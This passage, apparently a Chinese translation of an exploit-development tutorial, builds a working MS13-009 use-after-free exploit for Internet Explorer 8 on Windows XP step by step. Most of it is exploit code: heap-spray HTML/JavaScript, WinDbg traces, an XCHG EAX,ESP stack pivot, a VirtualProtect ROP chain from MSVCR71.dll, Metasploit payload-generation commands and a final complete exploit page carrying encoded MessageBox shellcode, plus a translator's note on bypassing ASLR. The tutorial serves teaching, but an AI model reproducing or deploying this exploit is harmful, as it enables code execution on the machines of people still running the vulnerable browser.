这一串指令以调用0x0c0c0c7c处的DWORD值（=EIP）而结束，如果0x0c0c0c7c在内存中是一个有效的地址的话。记住我们的堆喷射将shellcode对齐到了0x0c0c0c0c，下面我们会看到为什么这是必要的。只要记住我们可以设置EIP为任何想要的值，例如0xaaaaaaaa里的DWORD。这可以由覆盖EAX为0xaaaaaaaa-0x70=0xaaaaaa3a来实现。你将在下面看到这个例子。

```html
<!doctype html>
<html>
<head>
<script>
 
    var data;
    var objArray = new Array(1150);
  
    setTimeout(function(){
    document.body.style.whiteSpace = "pre-line";
  
    //CollectGarbage();
  
        for (var i=0;i<1150;i++){
            objArray[i] = document.createElement('div');
            objArray[i].className = data += unescape("%uaaaa%uaa3a"); //Will set edx to DWORD 0xaaaaaaaa [EIP]
        }
  
        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
        }, 100)
  
</script>
</head>
<body>
<p> </p>
</body>
</html>
```

让我们在调试器中证实我们会以覆盖EIP为[0xaaaaaaaa]而告终。

```
0:019> g
(8cc.674): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=aaaaaa3a ebx=002060a8 ecx=024c00c8 edx=00000000 esi=0162bcd0 edi=00000000
eip=3cf76982 esp=0162bca4 ebp=0162bcbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!CElement::Doc+0x2:
3cf76982 8b5070          mov     edx,dword ptr [eax+70h] ds:0023:aaaaaaaa=????????

0:019> d ecx
024c00c8  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................
024c00d8  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................
024c00e8  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................
024c00f8  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................
024c0108  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................
024c0118  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................
024c0128  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................
024c0138  3a aa aa aa 3a aa aa aa-3a aa aa aa 3a aa aa aa  ................
```

## MS13-009代码执行

走得挺远了！把这些内容放在一起我们就可以开启代码执行之旅了。首先创建我们新的POC，它包含了堆喷射以及触发漏洞的代码。

```html
<!doctype html>
<html>
<head>
<script>
 
    //Fix BSTR spec
    function alloc(bytes, mystr) {
        while (mystr.length<bytes) mystr += mystr;
        return mystr.substr(0, (bytes-6)/2);
    }
     
    block_size = 0x1000;
    padding_size = 0x5F4; //0x5FA => offset 0x1000 hex block to 0x0c0c0c0c
    Padding = '';
    NopSlide = '';
     
    var Shellcode = unescape(
    '%u7546%u7a7a%u5379'+   // ASCII
    '%u6365%u7275%u7469'+   // FuzzySecurity
    '%u9079');
     
    for (p = 0; p < padding_size; p++){ 
    Padding += unescape('%ub33f');}
     
    for (c = 0; c < block_size; c++){ 
    NopSlide += unescape('%u9090');}
    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
     
    var OBJECT = Padding + Shellcode + NopSlide;
    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
     
    var evil = new Array();
    for (var k = 0; k < 150; k++) {
        evil[k] = OBJECT.substr(0, OBJECT.length);
    }
  
    var data;
    var objArray = new Array(1150);
   
    setTimeout(function(){
    document.body.style.whiteSpace = "pre-line";
   
    //CollectGarbage();
   
        for (var i=0;i<1150;i++){
            objArray[i] = document.createElement('div');
            objArray[i].className = data += unescape("%u0c0c%u0c0c");
        }
   
        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
        }, 100)
   
</script>
</head>
<body>
<p> </p>
</body>
</html>
```

从下面的截图可以看到，我们覆盖了EIP为0x90909090，这是因为EIP从0x0c0c0c0c+0x70=0x0c0c0c7c中获取了DWORD值，它指向我们的nopslide。

![](/images/exploit/fuzzySecurity/20180105_3.jpg)

这一开始会有点困惑，下面的图示会帮助你理清！

```
mshtml!CElement::Doc:
3cf76980 8b01            mov     eax,dword ptr [ecx]      /// eax = 0x0c0c0c0c
3cf76982 8b5070          mov     edx,dword ptr [eax+70h]  /// edx = 0x0c0c0c0c + 0x70 = DWORD 0x0c0c0c7c
3cf76985 ffd2            call    edx                      /// call DWORD 0x0c0c0c7c


 ________________________
|                        |
|        Padding         |
|                        |
|                        |
|                        |
|                        |
|                        |
|------------------------| <-- 0x0c0c0c0c (= EAX), this points exactly at the start of our shellcode 
|       Shellcode        |     variable.
|------------------------|
|                        |
|                        |
|         NOP's          |
|                        |
|                        | <-- 0x0c0c0c7c (= EAX+70h), EIP is overwritten by the DWORD value at this 
|                        |     address, in this case 0x90909090.
|                        |
|                        |
|                        |
|                        |
|                        |
|     (0x1000 Block)     |
|________________________|
```

让我们尝试把shellcode进行padding从而让它精准的覆盖EIP。我们可以通过预置一个缓冲区长度为0x70的unescape ASCII字符串来实现（112-bytes = 28-DWORD's）。

```html
<!doctype html>
<html>
<head>
<script>
 
    //Fix BSTR spec
    function alloc(bytes, mystr) {
        while (mystr.length<bytes) mystr += mystr;
        return mystr.substr(0, (bytes-6)/2);
    }
     
    block_size = 0x1000;
    padding_size = 0x5F4; //0x5FA => offset 0x1000 hex block to 0x0c0c0c0c
    Padding = '';
    NopSlide = '';
     
    var Shellcode = unescape(
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+   // Padding 0x70 hex!
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u7546%u7a7a%u5379'+   // ASCII
    '%u6365%u7275%u7469'+   // FuzzySecurity
    '%u9079');
     
    for (p = 0; p < padding_size; p++){ 
    Padding += unescape('%ub33f');}
     
    for (c = 0; c < block_size; c++){ 
    NopSlide += unescape('%u9090');}
    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
     
    var OBJECT = Padding + Shellcode + NopSlide;
    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
     
    var evil = new Array();
    for (var k = 0; k < 150; k++) {
        evil[k] = OBJECT.substr(0, OBJECT.length);
    }
  
    var data;
    var objArray = new Array(1150);
   
    setTimeout(function(){
    document.body.style.whiteSpace = "pre-line";
   
    //CollectGarbage();
   
        for (var i=0;i<1150;i++){
            objArray[i] = document.createElement('div');
            objArray[i].className = data += unescape("%u0c0c%u0c0c");
        }
   
        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
        }, 100)
   
</script>
</head>
<body>
<p> </p>
</body>
</html>
```

如期所致，我们完美的控制了EIP。提醒一下，EIP的值是小端字节序。

![](/images/exploit/fuzzySecurity/20180105_4.jpg)

0x1000块的新布局如下。

```
 ________________________
|                        |
|        Padding         |
|                        |
|                        |
|                        |
|                        |
|                        |
|------------------------| <-- 0x0c0c0c0c (= EAX), this points exactly at the start of our shellcode 
|                        |     variable.
|                        |
|       Shellcode        |
|                        |
|                        |
|                        |
|---------[EIP]----------| <-- 0x0c0c0c7c (= EAX+70h), EIP is overwritten by the DWORD value at this 
|                        |     address.
|                        |
|         NOP's          |
|                        |
|                        |
|                        |
|     (0x1000 Block)     |
|________________________|
```

完美！现在我们不得不面对下一个障碍。我们的ROP链和shellcode会放在堆上，但是我们的栈指针（=ESP）指向了mshtml的某处。任何ROP gadget执行后都将返回到下一个栈上的地址因此我们需要劫持栈（Stack Pivot），把栈从mshtml的某处劫持到我们控制的堆上来（0x1000字节块）。你可能记得EAX指向了shellcode的起始，因此如果我们找到了一个ROP gadget可以将EAX交换给ESP的话（mov esp,eax/xchg eax,esp），我们就可以实现栈劫持并从0x0c0c0c0c地址处开始执行ROP链了。

我将从MSVCR71.dll中使用ROP gadgets，它是java6的包，会被IE自动加载。我通过 [mona](http://redmine.corelan.be/projects/mona/repository)生成了两个文本文件：

1. **MSVCR71_rop_suggestions.txt**包含了各种主题组织成的ROP gadgets列表
2. **MSVCR71_rop.txt**包含了原始的ROP gadgets列表

如果你想要玩玩的话我建议你去下载这些文件并用正则来解析它们。

**MSVCR71_rop_suggestions.txt** - [here](http://www.fuzzysecurity.com/tutorials/expDev/tools/MSVCR71_rop_suggestions.txt)

**MSVCR71_rop.txt** - [here](http://www.fuzzysecurity.com/tutorials/expDev/tools/MSVCR71_rop.txt)

通过解析文本文件，我们可以简单的搜索到想要的gadget，让我们修改POC，验证一下是否已然万事俱备。

> 译者注：stack pivot是个偷梁换柱的技术，把堆变成栈，然后在堆上放置的ROP链就发挥作用了。但利用后是否要进行复原操作，或者遗留副作用，则要具体情况具体分析了。另外，作者之所以仅用MSVCR71.dll来生成ROP，是因为这个dll没有开启ASLR，这就为ROP链的地址硬编码提供了稳定性。后期的IE可能找不到没有开启ASLR的模块，通过利用未开启ASLR的模块来绕过ASLR已经不适用了，但这并不代表无计可施，最常见的，我们可以找到某个可以leak info的地方，比如leak处某个对象的虚表地址，利用虚表地址在模块中的偏移就可以获取该模块的基地址（ASLR变的是基地址，但虚表的相对偏移不会变），此时就可以利用这个模块的ROP gadgets了。

```html
<!doctype html>
<html>
<head>
<script>
 
    //Fix BSTR spec
    function alloc(bytes, mystr) {
        while (mystr.length<bytes) mystr += mystr;
        return mystr.substr(0, (bytes-6)/2);
    }
     
    block_size = 0x1000;
    padding_size = 0x5F4; //0x5FA => offset 0x1000 hex block to 0x0c0c0c0c
    Padding = '';
    NopSlide = '';
     
    var Shellcode = unescape(
    '%u4242%u4242'+  // EIP will be overwritten with 0x42424242 (= BBBB)
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+
    '%u4141%u4141'+  
    '%u8b05%u7c34'); // 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
     
    for (p = 0; p < padding_size; p++){ 
    Padding += unescape('%ub33f');}
     
    for (c = 0; c < block_size; c++){ 
    NopSlide += unescape('%u9090');}
    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
     
    var OBJECT = Padding + Shellcode + NopSlide;
    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
     
    var evil = new Array();
    for (var k = 0; k < 150; k++) {
        evil[k] = OBJECT.substr(0, OBJECT.length);
    }
  
    var data;
    var objArray = new Array(1150);
   
    setTimeout(function(){
    document.body.style.whiteSpace = "pre-line";
   
    //CollectGarbage();
   
        for (var i=0;i<1150;i++){
            objArray[i] = document.createElement('div');
            objArray[i].className = data += unescape("%u0c0c%u0c0c");
        }
   
        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
        }, 100)
   
</script>
</head>
<body>
<p> </p>
</body>
</html>
```

从截图中可以看到命中了xchg eax, esp指令，如果我们继续执行的话，就可以成功的劫持栈并执行0x0c0c0c0c的第一个DWORD了。

![](/images/exploit/fuzzySecurity/20180105_5.jpg)

![](/images/exploit/fuzzySecurity/20180105_6.jpg)

目前已基本搞定。我们现在需要执行ROP链去禁止一个内存区域的DEP保护，此后我们就可以执行第二个舞台上防止的payload了。幸运的是，MSVCR71.dll已经被攻击者反复滥用过，该dll有一个优化过的ROP链可用，它由 corelanc0d3r [here](https://www.corelan.be/index.php/security/corelan-ropdb/#msvcr71dll_8211_v71030524)创建。让我们把这个ROP链插入到POC中并重新运行exp。

```html
<!doctype html>
<html>
<head>
<script>
 
    //Fix BSTR spec
    function alloc(bytes, mystr) {
        while (mystr.length<bytes) mystr += mystr;
        return mystr.substr(0, (bytes-6)/2);
    }
     
    block_size = 0x1000;
    padding_size = 0x5F4; //0x5FA => offset 0x1000 hex block to 0x0c0c0c0c
    Padding = '';
    NopSlide = '';
     
    var Shellcode = unescape(
     
    //--------------------------------------------------------[ROP]-//
    // Generic ROP-chain based on MSVCR71.dll
    //--------------------------------------------------------------//
    "%u653d%u7c37" + // 0x7c37653d : POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
    "%ufdff%uffff" + // 0xfffffdff : Value to negate, will become 0x00000201 (dwSize)
    "%u7f98%u7c34" + // 0x7c347f98 : RETN (ROP NOP) [msvcr71.dll]
    "%u15a2%u7c34" + // 0x7c3415a2 : JMP [EAX] [msvcr71.dll]
    "%uffff%uffff" + // 0xffffffff : 
    "%u6402%u7c37" + // 0x7c376402 : skip 4 bytes [msvcr71.dll]
    "%u1e05%u7c35" + // 0x7c351e05 : NEG EAX # RETN [msvcr71.dll] 
    "%u5255%u7c34" + // 0x7c345255 : INC EBX # FPATAN # RETN [msvcr71.dll] 
    "%u2174%u7c35" + // 0x7c352174 : ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll] 
    "%u4f87%u7c34" + // 0x7c344f87 : POP EDX # RETN [msvcr71.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : Value to negate, will become 0x00000040
    "%u1eb1%u7c35" + // 0x7c351eb1 : NEG EDX # RETN [msvcr71.dll] 
    "%ud201%u7c34" + // 0x7c34d201 : POP ECX # RETN [msvcr71.dll] 
    "%ub001%u7c38" + // 0x7c38b001 : &Writable location [msvcr71.dll]
    "%u7f97%u7c34" + // 0x7c347f97 : POP EAX # RETN [msvcr71.dll] 
    "%ua151%u7c37" + // 0x7c37a151 : ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
    "%u8c81%u7c37" + // 0x7c378c81 : PUSHAD # ADD AL,0EF # RETN [msvcr71.dll] 
    "%u5c30%u7c34" + // 0x7c345c30 : ptr to "push esp #  ret " [msvcr71.dll]
     
    //-------------------------------------------------[ROP Epilog]-//
    // After calling VirtalProtect() we are left with some junk.
    //--------------------------------------------------------------//
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" + // Junk
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
     
    //-------------------------------------------[EIP - Stackpivot]-//
    // EIP = 0x7c342643 # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
    //--------------------------------------------------------------//
    "%u8b05%u7c34"); // 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
     
    for (p = 0; p < padding_size; p++){ 
    Padding += unescape('%ub33f');}
     
    for (c = 0; c < block_size; c++){ 
    NopSlide += unescape('%u9090');}
    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
     
    var OBJECT = Padding + Shellcode + NopSlide;
    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
     
    var evil = new Array();
    for (var k = 0; k < 150; k++) {
        evil[k] = OBJECT.substr(0, OBJECT.length);
    }
  
    var data;
    var objArray = new Array(1150);
   
    setTimeout(function(){
    document.body.style.whiteSpace = "pre-line";
   
    //CollectGarbage();
   
        for (var i=0;i<1150;i++){
            objArray[i] = document.createElement('div');
            objArray[i].className = data += unescape("%u0c0c%u0c0c");
        }
   
        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
        }, 100)
   
</script>
</head>
<body>
<p> </p>
</body>
</html>
```

从截图中我们可以看到我们在栈劫持后成功命中了第一个gadget，在调用VirtualProtect后直达我们留下来的junk处。

![](/images/exploit/fuzzySecurity/20180105_7.jpg)

![](/images/exploit/fuzzySecurity/20180105_8.jpg)

现在剩下的就是在junk buffer的最后插入一个短跳转，跳过我们的初始化EIP覆盖位置（XCHG EAX,ESP #RETN）。这里可以放任何shellcode，在短跳转后就得以执行！

```html
<!doctype html>
<html>
<head>
<script>
 
    //Fix BSTR spec
    function alloc(bytes, mystr) {
        while (mystr.length<bytes) mystr += mystr;
        return mystr.substr(0, (bytes-6)/2);
    }
     
    block_size = 0x1000;
    padding_size = 0x5F4; //0x5FA => offset 0x1000 hex block to 0x0c0c0c0c
    Padding = '';
    NopSlide = '';
     
    var Shellcode = unescape(
     
    //--------------------------------------------------------[ROP]-//
    // Generic ROP-chain based on MSVCR71.dll
    //--------------------------------------------------------------//
    "%u653d%u7c37" + // 0x7c37653d : POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
    "%ufdff%uffff" + // 0xfffffdff : Value to negate, will become 0x00000201 (dwSize)
    "%u7f98%u7c34" + // 0x7c347f98 : RETN (ROP NOP) [msvcr71.dll]
    "%u15a2%u7c34" + // 0x7c3415a2 : JMP [EAX] [msvcr71.dll]
    "%uffff%uffff" + // 0xffffffff : 
    "%u6402%u7c37" + // 0x7c376402 : skip 4 bytes [msvcr71.dll]
    "%u1e05%u7c35" + // 0x7c351e05 : NEG EAX # RETN [msvcr71.dll] 
    "%u5255%u7c34" + // 0x7c345255 : INC EBX # FPATAN # RETN [msvcr71.dll] 
    "%u2174%u7c35" + // 0x7c352174 : ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll] 
    "%u4f87%u7c34" + // 0x7c344f87 : POP EDX # RETN [msvcr71.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : Value to negate, will become 0x00000040
    "%u1eb1%u7c35" + // 0x7c351eb1 : NEG EDX # RETN [msvcr71.dll] 
    "%ud201%u7c34" + // 0x7c34d201 : POP ECX # RETN [msvcr71.dll] 
    "%ub001%u7c38" + // 0x7c38b001 : &Writable location [msvcr71.dll]
    "%u7f97%u7c34" + // 0x7c347f97 : POP EAX # RETN [msvcr71.dll] 
    "%ua151%u7c37" + // 0x7c37a151 : ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
    "%u8c81%u7c37" + // 0x7c378c81 : PUSHAD # ADD AL,0EF # RETN [msvcr71.dll] 
    "%u5c30%u7c34" + // 0x7c345c30 : ptr to "push esp #  ret " [msvcr71.dll]
     
    //-------------------------------------------------[ROP Epilog]-//
    // After calling VirtalProtect() we are left with some junk.
    //--------------------------------------------------------------//
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" + // Junk
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u04eb" + // 0xeb04 short jump to get over what used to be EIP
     
    //-------------------------------------------[EIP - Stackpivot]-//
    // EIP = 0x7c342643 # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
    //--------------------------------------------------------------//
    "%u8b05%u7c34"); // 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
     
    for (p = 0; p < padding_size; p++){ 
    Padding += unescape('%ub33f');}
     
    for (c = 0; c < block_size; c++){ 
    NopSlide += unescape('%u9090');}
    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
     
    var OBJECT = Padding + Shellcode + NopSlide;
    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
     
    var evil = new Array();
    for (var k = 0; k < 150; k++) {
        evil[k] = OBJECT.substr(0, OBJECT.length);
    }
  
    var data;
    var objArray = new Array(1150);
   
    setTimeout(function(){
    document.body.style.whiteSpace = "pre-line";
   
    //CollectGarbage();
   
        for (var i=0;i<1150;i++){
            objArray[i] = document.createElement('div');
            objArray[i].className = data += unescape("%u0c0c%u0c0c");
        }
   
        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
        }, 100)
   
</script>
</head>
<body>
<p> </p>
</body>
</html>
```

执行短跳转后，我们跳到了覆盖EIP的位置正后方，我们现在就可以执行任何选择的shellcode了。

![](/images/exploit/fuzzySecurity/20180105_9.jpg)

## Shellcode+游戏结束

最简单的部分，让我们生成一些shellcode！

```bash
root@Trident:~# msfpayload windows/messagebox O

       Name: Windows MessageBox
     Module: payload/windows/messagebox
    Version: 0
   Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 270
       Rank: Normal

Provided by:
  corelanc0d3r <peter.ve@corelan.be>
  jduck <jduck@metasploit.com>

Basic options:
Name      Current Setting   Required  Description
----      ---------------   --------  -----------
EXITFUNC  process           yes       Exit technique: seh, thread, process, none
ICON      NO                yes       Icon type can be NO, ERROR, INFORMATION, WARNING or QUESTION
TEXT      Hello, from MSF!  yes       Messagebox Text (max 255 chars)
TITLE     MessageBox        yes       Messagebox Title (max 255 chars)

Description:
  Spawns a dialog via MessageBox using a customizable title, text & 
  icon


root@Trident:~# msfpayload windows/messagebox text='Bang, bang!' title='b33f' R| msfencode -t js_le
[*] x86/shikata_ga_nai succeeded with size 282 (iteration=1)

%ud1bb%u6f46%ud9e9%ud9c7%u2474%u5af4%uc931%u40b1%uc283%u3104%u115a%u5a03%ue211%u9f24%u7284
%u541f%u717f%u47ae%u0ecd%uaee1%u7a56%u0170%u0a1c%uea7e%uef54%uaaf5%u8490%u1377%uac2a%u1cbf
%ua434%ufb4c%u9745%u1d4d%u9c25%ufadd%u2982%u3f58%u7940%u474a%u6857%ufd01%ue74f%u224f%u1c71
%u168c%u6938%udc66%u83bb%u1db7%u9b8a%u4d4b%udb69%u89c7%u13b3%u972a%u47f4%uacc0%ub386%ua600
%u3797%u6c0a%ua359%ue7cc%u7855%ua29b%u7f79%ud970%uf486%u3687%u4e0f%udaa3%u8c71%uea19%uc658
%u0ed4%u2413%u5e8e%ua76a%u0da2%u289b%u4dc5%udea4%ub67c%u9fe0%u54a6%ue765%ubd4a%u0fd8%u42fc
%u3023%uf889%ua7d4%u6ee5%u76c5%u5d9d%u5737%uca39%ud442%u78a4%u4625%u7702%u91bc%u781c%u59eb
%u4429%ud944%ueb81%ua128%uf756%u8b96%u69b0%ud428%u02bf%u0b8e%uf31f%u2e46%uc06c%u9ff0%uae49
%ufba1%u2669%u6cba%u5f1f%u351c%ub3b7%ua77e%ua426%u463c%u53c6%u41f0%ud09e%u5ad6%u0917%u8f27
%u9975%u7d19%ucd86%u41ab%u1128%u499e
```

很好，现在我们清理POC，增加注释，运行最后的exp。我想再次提及的是这个漏洞有一些不稳定性（大概80%复现），如果有人有什么好主意请留言。

```html
<!-----------------------------------------------------------------------------
// Exploit: MS13-009 Use-After-Free IE8 (DEP)                                //
// Author: b33f - http://www.fuzzysecurity.com/                              //
// OS: Tested on XP PRO SP3                                                  //
// Browser: Internet Explorer 8.00.6001.18702                                //
//---------------------------------------------------------------------------//
// This exploit was created for Part 9 of my Exploit Development tutorial    //
// series => http://www.fuzzysecurity.com/tutorials/expDev/11.html           //
------------------------------------------------------------------------------>
 
<!doctype html>
<html>
<head>
<script>
 
    //Fix BSTR spec
    function alloc(bytes, mystr) {
        while (mystr.length<bytes) mystr += mystr;
        return mystr.substr(0, (bytes-6)/2);
    }
     
    block_size = 0x1000;
    padding_size = 0x5F4; //0x5FA => offset 0x1000 hex block to 0x0c0c0c0c
    Padding = '';
    NopSlide = '';
     
    var Shellcode = unescape(
     
    //--------------------------------------------------------[ROP]-//
    // Generic ROP-chain based on MSVCR71.dll
    //--------------------------------------------------------------//
    "%u653d%u7c37" + // 0x7c37653d : POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
    "%ufdff%uffff" + // 0xfffffdff : Value to negate, will become 0x00000201 (dwSize)
    "%u7f98%u7c34" + // 0x7c347f98 : RETN (ROP NOP) [msvcr71.dll]
    "%u15a2%u7c34" + // 0x7c3415a2 : JMP [EAX] [msvcr71.dll]
    "%uffff%uffff" + // 0xffffffff : 
    "%u6402%u7c37" + // 0x7c376402 : skip 4 bytes [msvcr71.dll]
    "%u1e05%u7c35" + // 0x7c351e05 : NEG EAX # RETN [msvcr71.dll] 
    "%u5255%u7c34" + // 0x7c345255 : INC EBX # FPATAN # RETN [msvcr71.dll] 
    "%u2174%u7c35" + // 0x7c352174 : ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [msvcr71.dll] 
    "%u4f87%u7c34" + // 0x7c344f87 : POP EDX # RETN [msvcr71.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : Value to negate, will become 0x00000040
    "%u1eb1%u7c35" + // 0x7c351eb1 : NEG EDX # RETN [msvcr71.dll] 
    "%ud201%u7c34" + // 0x7c34d201 : POP ECX # RETN [msvcr71.dll] 
    "%ub001%u7c38" + // 0x7c38b001 : &Writable location [msvcr71.dll]
    "%u7f97%u7c34" + // 0x7c347f97 : POP EAX # RETN [msvcr71.dll] 
    "%ua151%u7c37" + // 0x7c37a151 : ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
    "%u8c81%u7c37" + // 0x7c378c81 : PUSHAD # ADD AL,0EF # RETN [msvcr71.dll] 
    "%u5c30%u7c34" + // 0x7c345c30 : ptr to "push esp #  ret " [msvcr71.dll]
     
    //-------------------------------------------------[ROP Epilog]-//
    // After calling VirtalProtect() we are left with some junk.
    //--------------------------------------------------------------//
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" + // Junk
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u4141" +
    "%u4141%u04eb" + // 0xeb04 short jump to get over what used to be EIP
     
    //-------------------------------------------[EIP - Stackpivot]-//
    // EIP = 0x7c342643 # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
    //--------------------------------------------------------------//
    "%u8b05%u7c34" + // 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
     
    //--------------------------------------------------[shellcode]-//
    // js Little Endian Messagebox => "Bang, bang!"
    //--------------------------------------------------------------//
    "%ud1bb%u6f46%ud9e9%ud9c7%u2474%u5af4%uc931%u40b1%uc283%u3104%u115a%u5a03%ue211" +
    "%u9f24%u7284%u541f%u717f%u47ae%u0ecd%uaee1%u7a56%u0170%u0a1c%uea7e%uef54%uaaf5" +
    "%u8490%u1377%uac2a%u1cbf%ua434%ufb4c%u9745%u1d4d%u9c25%ufadd%u2982%u3f58%u7940" +
    "%u474a%u6857%ufd01%ue74f%u224f%u1c71%u168c%u6938%udc66%u83bb%u1db7%u9b8a%u4d4b" +
    "%udb69%u89c7%u13b3%u972a%u47f4%uacc0%ub386%ua600%u3797%u6c0a%ua359%ue7cc%u7855" +
    "%ua29b%u7f79%ud970%uf486%u3687%u4e0f%udaa3%u8c71%uea19%uc658%u0ed4%u2413%u5e8e" +
    "%ua76a%u0da2%u289b%u4dc5%udea4%ub67c%u9fe0%u54a6%ue765%ubd4a%u0fd8%u42fc%u3023" +
    "%uf889%ua7d4%u6ee5%u76c5%u5d9d%u5737%uca39%ud442%u78a4%u4625%u7702%u91bc%u781c" +
    "%u59eb%u4429%ud944%ueb81%ua128%uf756%u8b96%u69b0%ud428%u02bf%u0b8e%uf31f%u2e46" +
    "%uc06c%u9ff0%uae49%ufba1%u2669%u6cba%u5f1f%u351c%ub3b7%ua77e%ua426%u463c%u53c6" +
    "%u41f0%ud09e%u5ad6%u0917%u8f27%u9975%u7d19%ucd86%u41ab%u1128%u499e");
     
    for (p = 0; p < padding_size; p++){ 
    Padding += unescape('%ub33f');}
     
    for (c = 0; c < block_size; c++){ 
    NopSlide += unescape('%u9090');}
    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
     
    var OBJECT = Padding + Shellcode + NopSlide;
    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
     
    var evil = new Array();
    for (var k = 0; k < 150; k++) {
        evil[k] = OBJECT.substr(0, OBJECT.length);
    }
  
    var data;
    var objArray = new Array(1150);
   
    setTimeout(function(){
    document.body.style.whiteSpace = "pre-line";
   
    //CollectGarbage();
   
        for (var i=0;i<1150;i++){
            objArray[i] = document.createElement('div');
            objArray[i].className = data += unescape("%u0c0c%u0c0c");
        }
   
        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
        }, 100)
   
</script>
</head>
<body>
<p> </p>
</body>
</html>
```

![](/images/exploit/fuzzySecurity/20180105_10.jpg)

